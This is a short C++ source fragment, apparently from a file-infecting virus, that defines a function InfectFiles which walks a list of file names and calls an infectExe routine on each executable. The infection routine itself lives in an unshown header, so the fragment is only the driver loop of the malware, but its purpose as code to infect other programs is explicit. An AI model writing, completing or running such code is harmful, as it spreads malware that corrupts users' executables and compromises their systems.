#include "infect.h"
#include <list>
void InfectFiles(list<string> files,char *argv[])
{
	infect Infect(argv);
	for (string each : files)
	{
		Infect.infectExe(each);
	}
}